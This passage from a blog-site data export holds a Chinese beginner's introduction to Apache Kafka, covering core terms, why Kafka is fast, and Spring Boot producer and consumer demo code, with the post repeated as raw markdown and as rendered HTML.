消息消费者\n\n- Consumer Group\n\n  消费者所属组，组内的所有消费者协调在一起来消费订阅主题(subscribed topics)的所有分区(partition)。当然，每个分区只能由同一个消费组内的一个consumer来消费.<br>\n  重要的再说一遍: Consumer Group下订阅的topic下的某一个分区只能分配给某个group下的一个consumer(当然该分区还可以被分配给其他group).\n\n# 二.Kafka作用与意义\n\n为什么要用它,与其它产品相比怎么样？\n\n## 1.为什么用它\n\n### 高吞吐率，高性能\n\n<br>怎么实现？<br>\n\n\n  - 写入\n\n  基于操作系统的页缓存来写入文件，相当于kafka将文件写入内存，然后由操作系统来决定什么时候将内存中的信息写入磁盘。\n\n  以磁盘顺序来写入数据，不会在文件随机位置修改数据。\n  - 读取\n\n  零拷贝技术，省略了两次拷贝(OS Cache将数据拷贝到应用程序缓存和 应用程序缓存拷贝数据到socket缓存)，直接将数据发送到网卡.\n\n  ![kafka_data_transmission](http://67.216.218.49:8000/file/blogs/java/bigdata/kafka_data_transmission_01.png)\n\n  原图出处: https://juejin.im/post/5cc00ac95188250a59405322\n\n### 分布式\n\n数据分布式存储(特点就是可以存极大数据)，消费者可以根据分区来进行读取。\n\n###  消息队列的通用优点\n\n灵活，销峰，缓冲等。\n\n## 2.和redis区别\n\n###  kafka发布订阅模式，和redis有啥不同？\n\n\n# 三.怎么用\n\n\n## 1.springboot中kafka集成\n```\n<dependency>\n      <groupId>org.springframework.kafka</groupId>\n      <artifactId>spring-kafka</artifactId>\n      <version>2.2.9.RELEASE</version>\n</dependency>\n```\n\n配置文件application.properties\n```\n\nserver.port=8888\n\n#kafka，更多配置查看kafka的属性类：org.springframework.boot.autoconfigure.kafka.KafkaProperties\n#指定kafka 代理地址，可以多个\n#spring.kafka.bootstrap-servers=192.168.1.159:9092,192.168.1.159:9093,192.168.1.159:9094\nspring.kafka.bootstrap-servers=localhost:9092\n#指定默认topic id\nspring.kafka.template.default-topic=testDemo\n#指定listener 容器中的线程数，用于提高并发量\nspring.kafka.listener.concurrency=3\n#每次批量发送消息的数量\nspring.kafka.producer.batch-size=1000\n#将Java对象转换成字节数组发送给broker\nspring.kafka.producer.key-serializer=org.apache.kafka.common.serialization.StringSerializer\nspring.kafka.producer.value-serializer=org.apache.kafka.common.serialization.StringSerializer\n\n#指定默认消费者group id\nspring.kafka.consumer.group-id=myGroup1\n#若设置为earliest，那么会从头开始读partition，latest读取最新的\nspring.kafka.consumer.auto-offset-reset=latest\n#将字节数组读取\nspring.kafka.consumer.key-deserializer=org.apache.kafka.common.serialization.StringDeserializer\nspring.kafka.consumer.value-deserializer=org.apache.kafka.common.serialization.StringDeserializer\n```\n\n## 2.生产一条消息\nKafkaTemplate 是Spring提供的用来发消息的实现类，可以在application.properties中进行配置属性，也可以用kafka自己的KafkaProducer来send()消息.\n\n```\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Properties;\n\n/**\n * kafka生产者send()消息demo\n *\n * 两种，一种是Spring提供的可以用spring配置的KafkaTemplate\n * 一种是Kafka自带的，需要自己注入配置信息的KafkaProducer\n */\n\n@Component\npublic class ProducerDemo {\n\n\n    @Autowired\n    private KafkaTemplate kafkaTemplate;\n\n\n    public void send1(){\n        try {\n            kafkaTemplate.send(\"testDemo\",\"data1\");\n            System.out.println(\"[*]: send success 1 !\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    public void send2(){\n        Properties kafkaProps = new Properties();\n        kafkaProps.put(\"bootstrap.servers\",\"localhost:9092\");\n        kafkaProps.put(\"key.serializer\",\"org.apache.kafka.common.serialization.StringSerializer\");\n        kafkaProps.put(\"value.serializer\",\"org.apache.kafka.common.serialization.StringSerializer\");\n\n        KafkaProducer producer = new KafkaProducer<String, String>(kafkaProps);\n\n        ProducerRecord record = new ProducerRecord(\"testDemo\",\"data2\");\n\n        try{\n            producer.send(record);\n            System.out.println(\"[*]: send success 2 !\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n}\n\n```\n\n## 3.订阅消费消息\n```\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.stereotype.Component;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\n\n/**\n * kafka消费消息demo\n *\n * 1.@KafkaListener 注解为Spring提供用来监听数据的，\n * 由KafkaListenerAnnotationBeanPostProcessor类在postProcessAfterInitialization()时读取所有@Kafkalistener注解\n *\n * 2.KafkaConsumer为kafka自带的类，需要自己初始化配置文件\n */\n@Component\npublic class ConsumerDemo {\n\n    @KafkaListener(id = \"testConsumer1\", topics = \"testDemo\", groupId = \"myGroup1\")\n    public void receive1(String data){\n        System.out.println(\"[*]: receive success 1 !\");\n        System.out.println(data);\n\n    }\n\n    public void receive2(){\n        Properties kafkaProps = new Properties();\n        kafkaProps.put(\"bootstrap.servers\",\"localhost:9092\");\n        kafkaProps.put(\"group.id\",\"myGroup1\");\n        kafkaProps.put(\"key.deserializer\",\"org.apache.kafka.common.serialization.StringDeserializer\");\n        kafkaProps.put(\"value.deserializer\",\"org.apache.kafka.common.serialization.StringDeserializer\");\n\n        KafkaConsumer kafkaConsumer = new KafkaConsumer(kafkaProps);\n\n        //List topics = List.of(\"testDemo\");\n        List<String> topics = new ArrayList<>();\n        topics.add(\"testDemo\");\n\n        try {\n            kafkaConsumer.subscribe(topics);\n            System.out.println(\"[*]: receive success 2 !\");\n            while(true){\n                ConsumerRecords consumerRecords = kafkaConsumer.poll(1000);\n                if(!consumerRecords.isEmpty()){\n                   for(Object consumerRecord: consumerRecords.records(\"testDemo\")){\n                       ConsumerRecord temp = (ConsumerRecord)consumerRecord;\n                       System.out.println(\"[*]: new data: \" + temp.value());\n                   }\n                }\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n# 四.其它\n","source":"_posts/java/kafka初探.md","raw":"---\ntitle: kafka初了解\ndate: 2019-10-9 13:23:25\ntags: [java,spring]\n---\n\n\nwin下Kafka测试环境搭建：https://blog.csdn.net/u012050154/article/details/76270655\n\n# 一.Kafka是什么\n\n## 1.是什么\n\n我的理解是，kafka是一个分布式的消息队列，提供发布订阅功能.\n\n## 2.专有名词\n\nBroker/Topic/Partition/Producer/Consumer/Consumer Group<br>\n\n- Broker\n\n  Kafka集群包含一个或多个服务器，这种服务器被称为broker.\n\n- topic\n\n  每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic（物理上不同Topic的消息分开存储[表现于日志落地]，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处）\n\n- partition\n\n  Parition是物理上的概念，每个Topic包含一个或多个Partition.\n\n- Producer\n\n  消息生产者\n\n- Consumer\n\n  消息消费者\n\n- Consumer Group\n\n  消费者所属组，组内的所有消费者协调在一起来消费订阅主题(subscribed topics)的所有分区(partition)。当然，每个分区只能由同一个消费组内的一个consumer来消费.<br>\n  重要的再说一遍: Consumer Group下订阅的topic下的某一个分区只能分配给某个group下的一个consumer(当然该分区还可以被分配给其他group).\n\n# 二.Kafka作用与意义\n\n为什么要用它,与其它产品相比怎么样？\n\n## 1.为什么用它\n\n### 高吞吐率，高性能\n\n<br>怎么实现？<br>\n\n\n  - 写入\n\n  基于操作系统的页缓存来写入文件，相当于kafka将文件写入内存，然后由操作系统来决定什么时候将内存中的信息写入磁盘。\n\n  以磁盘顺序来写入数据，不会在文件随机位置修改数据。\n  - 读取\n\n  零拷贝技术，省略了两次拷贝(OS Cache将数据拷贝到应用程序缓存和 应用程序缓存拷贝数据到socket缓存)，直接将数据发送到网卡.\n\n  ![kafka_data_transmission](http://67.216.218.49:8000/file/blogs/java/bigdata/kafka_data_transmission_01.png)\n\n  原图出处: https://juejin.im/post/5cc00ac95188250a59405322\n\n### 分布式\n\n数据分布式存储(特点就是可以存极大数据)，消费者可以根据分区来进行读取。\n\n###  消息队列的通用优点\n\n灵活，销峰，缓冲等。\n\n## 2.和redis区别\n\n###  kafka发布订阅模式，和redis有啥不同？\n\n\n# 三.怎么用\n\n\n## 1.springboot中kafka集成\n```\n<dependency>\n      <groupId>org.springframework.kafka</groupId>\n      <artifactId>spring-kafka</artifactId>\n      <version>2.2.9.RELEASE</version>\n</dependency>\n```\n\n配置文件application.properties\n```\n\nserver.port=8888\n\n#kafka，更多配置查看kafka的属性类：org.springframework.boot.autoconfigure.kafka.KafkaProperties\n#指定kafka 代理地址，可以多个\n#spring.kafka.bootstrap-servers=192.168.1.159:9092,192.168.1.159:9093,192.168.1.159:9094\nspring.kafka.bootstrap-servers=localhost:9092\n#指定默认topic id\nspring.kafka.template.default-topic=testDemo\n#指定listener 容器中的线程数，用于提高并发量\nspring.kafka.listener.concurrency=3\n#每次批量发送消息的数量\nspring.kafka.producer.batch-size=1000\n#将Java对象转换成字节数组发送给broker\nspring.kafka.producer.key-serializer=org.apache.kafka.common.serialization.StringSerializer\nspring.kafka.producer.value-serializer=org.apache.kafka.common.serialization.StringSerializer\n\n#指定默认消费者group id\nspring.kafka.consumer.group-id=myGroup1\n#若设置为earliest，那么会从头开始读partition，latest读取最新的\nspring.kafka.consumer.auto-offset-reset=latest\n#将字节数组读取\nspring.kafka.consumer.key-deserializer=org.apache.kafka.common.serialization.StringDeserializer\nspring.kafka.consumer.value-deserializer=org.apache.kafka.common.serialization.StringDeserializer\n```\n\n## 2.生产一条消息\nKafkaTemplate 是Spring提供的用来发消息的实现类，可以在application.properties中进行配置属性，也可以用kafka自己的KafkaProducer来send()消息.\n\n```\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Properties;\n\n/**\n * kafka生产者send()消息demo\n *\n * 两种，一种是Spring提供的可以用spring配置的KafkaTemplate\n * 一种是Kafka自带的，需要自己注入配置信息的KafkaProducer\n */\n\n@Component\npublic class ProducerDemo {\n\n\n    @Autowired\n    private KafkaTemplate kafkaTemplate;\n\n\n    public void send1(){\n        try {\n            kafkaTemplate.send(\"testDemo\",\"data1\");\n            System.out.println(\"[*]: send success 1 !\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    public void send2(){\n        Properties kafkaProps = new Properties();\n        kafkaProps.put(\"bootstrap.servers\",\"localhost:9092\");\n        kafkaProps.put(\"key.serializer\",\"org.apache.kafka.common.serialization.StringSerializer\");\n        kafkaProps.put(\"value.serializer\",\"org.apache.kafka.common.serialization.StringSerializer\");\n\n        KafkaProducer producer = new KafkaProducer<String, String>(kafkaProps);\n\n        ProducerRecord record = new ProducerRecord(\"testDemo\",\"data2\");\n\n        try{\n            producer.send(record);\n            System.out.println(\"[*]: send success 2 !\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n}\n\n```\n\n## 3.订阅消费消息\n```\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.stereotype.Component;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\n\n/**\n * kafka消费消息demo\n *\n * 1.@KafkaListener 注解为Spring提供用来监听数据的，\n * 由KafkaListenerAnnotationBeanPostProcessor类在postProcessAfterInitialization()时读取所有@Kafkalistener注解\n *\n * 2.KafkaConsumer为kafka自带的类，需要自己初始化配置文件\n */\n@Component\npublic class ConsumerDemo {\n\n    @KafkaListener(id = \"testConsumer1\", topics = \"testDemo\", groupId = \"myGroup1\")\n    public void receive1(String data){\n        System.out.println(\"[*]: receive success 1 !\");\n        System.out.println(data);\n\n    }\n\n    public void receive2(){\n        Properties kafkaProps = new Properties();\n        kafkaProps.put(\"bootstrap.servers\",\"localhost:9092\");\n        kafkaProps.put(\"group.id\",\"myGroup1\");\n        kafkaProps.put(\"key.deserializer\",\"org.apache.kafka.common.serialization.StringDeserializer\");\n        kafkaProps.put(\"value.deserializer\",\"org.apache.kafka.common.serialization.StringDeserializer\");\n\n        KafkaConsumer kafkaConsumer = new KafkaConsumer(kafkaProps);\n\n        //List topics = List.of(\"testDemo\");\n        List<String> topics = new ArrayList<>();\n        topics.add(\"testDemo\");\n\n        try {\n            kafkaConsumer.subscribe(topics);\n            System.out.println(\"[*]: receive success 2 !\");\n            while(true){\n                ConsumerRecords consumerRecords = kafkaConsumer.poll(1000);\n                if(!consumerRecords.isEmpty()){\n                   for(Object consumerRecord: consumerRecords.records(\"testDemo\")){\n                       ConsumerRecord temp = (ConsumerRecord)consumerRecord;\n                       System.out.println(\"[*]: new data: \" + temp.value());\n                   }\n                }\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n# 四.其它\n","slug":"java/kafka初探","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i200196dcpwv3kcknm","content":"<p>win下Kafka测试环境搭建：<a href=\"https://blog.csdn.net/u012050154/article/details/76270655\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012050154/article/details/76270655</a></p>\n<h1 id=\"一-Kafka是什么\"><a href=\"#一-Kafka是什么\" class=\"headerlink\" title=\"一.Kafka是什么\"></a>一.Kafka是什么</h1><h2 id=\"1-是什么\"><a href=\"#1-是什么\" class=\"headerlink\" title=\"1.是什么\"></a>1.是什么</h2><p>我的理解是，kafka是一个分布式的消息队列，提供发布订阅功能.</p>\n<h2 id=\"2-专有名词\"><a href=\"#2-专有名词\" class=\"headerlink\" title=\"2.专有名词\"></a>2.专有名词</h2><p>Broker/Topic/Partition/Producer/Consumer/Consumer Group<br></p>\n<ul>\n<li><p>Broker</p>\n<p>Kafka集群包含一个或多个服务器，这种服务器被称为broker.</p>\n</li>\n<li><p>topic</p>\n<p>每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic（物理上不同Topic的消息分开存储[表现于日志落地]，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处）</p>\n</li>\n<li><p>partition</p>\n<p>Parition是物理上的概念，每个Topic包含一个或多个Partition.</p>\n</li>\n<li><p>Producer</p>\n<p>消息生产者</p>\n</li>\n<li><p>Consumer</p>\n<p>消息消费者</p>\n</li>\n<li><p>Consumer Group</p>\n<p>消费者所属组，组内的所有消费者协调在一起来消费订阅主题(subscribed topics)的所有分区(partition)。当然，每个分区只能由同一个消费组内的一个consumer来消费.<br><br>重要的再说一遍: Consumer Group下订阅的topic下的某一个分区只能分配给某个group下的一个consumer(当然该分区还可以被分配给其他group).</p>\n</li>\n</ul>\n<h1 id=\"二-Kafka作用与意义\"><a href=\"#二-Kafka作用与意义\" class=\"headerlink\" title=\"二.Kafka作用与意义\"></a>二.Kafka作用与意义</h1><p>为什么要用它,与其它产品相比怎么样？</p>\n<h2 id=\"1-为什么用它\"><a href=\"#1-为什么用它\" class=\"headerlink\" title=\"1.为什么用它\"></a>1.为什么用它</h2><h3 id=\"高吞吐率，高性能\"><a href=\"#高吞吐率，高性能\" class=\"headerlink\" title=\"高吞吐率，高性能\"></a>高吞吐率，高性能</h3><p><br>怎么实现？<br></p>\n<ul>\n<li><p>写入</p>\n<p>基于操作系统的页缓存来写入文件，相当于kafka将文件写入内存，然后由操作系统来决定什么时候将内存中的信息写入磁盘。</p>\n<p>以磁盘顺序来写入数据，不会在文件随机位置修改数据。</p>\n</li>\n<li><p>读取</p>\n<p>零拷贝技术，省略了两次拷贝(OS Cache将数据拷贝到应用程序缓存和 应用程序缓存拷贝数据到socket缓存)，直接将数据发送到网卡.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/bigdata/kafka_data_transmission_01.png\" alt=\"kafka_data_transmission\"></p>\n<p>原图出处: <a href=\"https://juejin.im/post/5cc00ac95188250a59405322\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/5cc00ac95188250a59405322</a></p>\n</li>\n</ul>\n<h3 id=\"分布式\"><a href=\"#分布式\" class=\"headerlink\" title=\"分布式\"></a>分布式</h3><p>数据分布式存储(特点就是可以存极大数据)，消费者可以根据分区来进行读取。</p>\n<h3 id=\"消息队列的通用优点\"><a href=\"#消息队列的通用优点\" class=\"headerlink\" title=\"消息队列的通用优点\"></a>消息队列的通用优点</h3><p>灵活，销峰，缓冲等。</p>\n<h2 id=\"2-和redis区别\"><a href=\"#2-和redis区别\" class=\"headerlink\" title=\"2.和redis区别\"></a>2.和redis区别</h2><h3 id=\"kafka发布订阅模式，和redis有啥不同？\"><a href=\"#kafka发布订阅模式，和redis有啥不同？\" class=\"headerlink\" title=\"kafka发布订阅模式，和redis有啥不同？\"></a>kafka发布订阅模式，和redis有啥不同？</h3><h1 id=\"三-怎么用\"><a href=\"#三-怎么用\" class=\"headerlink\" title=\"三.怎么用\"></a>三.怎么用</h1><h2 id=\"1-springboot中kafka集成\"><a href=\"#1-springboot中kafka集成\" class=\"headerlink\" title=\"1.springboot中kafka集成\"></a>1.springboot中kafka集成</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">      &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;</span><br><span class=\"line\">      &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;</span><br><span class=\"line\">      &lt;version&gt;2.2.9.RELEASE&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>配置文件application.properties<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">server.port=8888</span><br><span class=\"line\"></span><br><span class=\"line\">#kafka，更多配置查看kafka的属性类：org.springframework.boot.autoconfigure.kafka.KafkaProperties</span><br><span class=\"line\">#指定kafka 代理地址，可以多个</span><br><span class=\"line\">#spring.kafka.bootstrap-servers=192.168.1.159:9092,192.168.1.159:9093,192.168.1.159:9094</span><br><span class=\"line\">spring.kafka.bootstrap-servers=localhost:9092</span><br><span class=\"line\">#指定默认topic id</span><br><span class=\"line\">spring.kafka.template.default-topic=testDemo</span><br><span class=\"line\">#指定listener 容器中的线程数，用于提高并发量</span><br><span class=\"line\">spring.kafka.listener.concurrency=3</span><br><span class=\"line\">#每次批量发送消息的数量</span><br><span class=\"line\">spring.kafka.producer.batch-size=1000</span><br><span class=\"line\">#将Java对象转换成字节数组发送给broker</span><br><span class=\"line\">spring.kafka.producer.key-serializer=org.apache.kafka.common.serialization.StringSerializer</span><br><span class=\"line\">spring.kafka.producer.value-serializer=org.apache.kafka.common.serialization.StringSerializer</span><br><span class=\"line\"></span><br><span class=\"line\">#指定默认消费者group id</span><br><span class=\"line\">spring.kafka.consumer.group-id=myGroup1</span><br><span class=\"line\">#若设置为earliest，那么会从头开始读partition，latest读取最新的</span><br><span class=\"line\">spring.kafka.consumer.auto-offset-reset=latest</span><br><span class=\"line\">#将字节数组读取</span><br><span class=\"line\">spring.kafka.consumer.key-deserializer=org.apache.kafka.common.serialization.StringDeserializer</span><br><span class=\"line\">spring.kafka.consumer.value-deserializer=org.apache.kafka.common.serialization.StringDeserializer</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-生产一条消息\"><a href=\"#2-生产一条消息\" class=\"headerlink\" title=\"2.生产一条消息\"></a>2.生产一条消息</h2><p>KafkaTemplate 是Spring提供的用来发消息的实现类，可以在application.properties中进行配置属性，也可以用kafka自己的KafkaProducer来send()消息.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class=\"line\">import org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.kafka.core.KafkaTemplate;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * kafka生产者send()消息demo</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 两种，一种是Spring提供的可以用spring配置的KafkaTemplate</span><br><span class=\"line\"> * 一种是Kafka自带的，需要自己注入配置信息的KafkaProducer</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class ProducerDemo &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    private KafkaTemplate kafkaTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public void send1()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            kafkaTemplate.send(&quot;testDemo&quot;,&quot;data1&quot;);</span><br><span class=\"line\">            System.out.println(&quot;[*]: send success 1 !&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void send2()&#123;</span><br><span class=\"line\">        Properties kafkaProps = new Properties();</span><br><span class=\"line\">        kafkaProps.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        KafkaProducer producer = new KafkaProducer&lt;String, String&gt;(kafkaProps);</span><br><span class=\"line\"></span><br><span class=\"line\">        ProducerRecord record = new ProducerRecord(&quot;testDemo&quot;,&quot;data2&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            producer.send(record);</span><br><span class=\"line\">            System.out.println(&quot;[*]: send success 2 !&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-订阅消费消息\"><a href=\"#3-订阅消费消息\" class=\"headerlink\" title=\"3.订阅消费消息\"></a>3.订阅消费消息</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.kafka.clients.consumer.ConsumerRecord;</span><br><span class=\"line\">import org.apache.kafka.clients.consumer.ConsumerRecords;</span><br><span class=\"line\">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class=\"line\">import org.springframework.kafka.annotation.KafkaListener;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * kafka消费消息demo</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 1.@KafkaListener 注解为Spring提供用来监听数据的，</span><br><span class=\"line\"> * 由KafkaListenerAnnotationBeanPostProcessor类在postProcessAfterInitialization()时读取所有@Kafkalistener注解</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 2.KafkaConsumer为kafka自带的类，需要自己初始化配置文件</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class ConsumerDemo &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @KafkaListener(id = &quot;testConsumer1&quot;, topics = &quot;testDemo&quot;, groupId = &quot;myGroup1&quot;)</span><br><span class=\"line\">    public void receive1(String data)&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*]: receive success 1 !&quot;);</span><br><span class=\"line\">        System.out.println(data);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void receive2()&#123;</span><br><span class=\"line\">        Properties kafkaProps = new Properties();</span><br><span class=\"line\">        kafkaProps.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;group.id&quot;,&quot;myGroup1&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;key.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        KafkaConsumer kafkaConsumer = new KafkaConsumer(kafkaProps);</span><br><span class=\"line\"></span><br><span class=\"line\">        //List topics = List.of(&quot;testDemo&quot;);</span><br><span class=\"line\">        List&lt;String&gt; topics = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        topics.add(&quot;testDemo&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            kafkaConsumer.subscribe(topics);</span><br><span class=\"line\">            System.out.println(&quot;[*]: receive success 2 